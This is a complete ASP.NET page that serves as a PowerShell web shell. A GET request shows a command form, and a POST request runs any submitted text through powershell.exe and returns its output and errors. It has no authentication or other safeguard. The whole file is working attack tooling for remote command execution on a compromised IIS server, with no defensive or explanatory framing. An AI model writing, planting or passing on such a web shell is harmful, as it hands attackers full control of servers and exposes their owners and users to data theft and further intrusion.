<%@ Page Language="C#" %>
<%
    if (Request.HttpMethod == "POST")
    {
        string command = Request.Form["cmd"];
        if (!string.IsNullOrEmpty(command))
        {
            try
            {
                // Setup the process to use PowerShell
                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("powershell.exe", "-Command " + command);
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.CreateNoWindow = true;
                
                using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
                {
                    using (System.IO.StreamReader reader = process.StandardOutput)
                    {
                        Response.Write("<pre>" + Server.HtmlEncode(reader.ReadToEnd()) + "</pre>");
                    }
                    using (System.IO.StreamReader reader = process.StandardError)
                    {
                        Response.Write("<pre>" + Server.HtmlEncode(reader.ReadToEnd()) + "</pre>");
                    }
                }
            }
            catch (Exception ex)
            {
                Response.Write("<p>Error: " + Server.HtmlEncode(ex.Message) + "</p>");
            }
        }
    }
    else
    {
        Response.Write("<form method='post' action=''>");
        Response.Write("Command: <input type='text' name='cmd' />");
        Response.Write("<input type='submit' value='Execute' />");
        Response.Write("</form>");
    }
%>
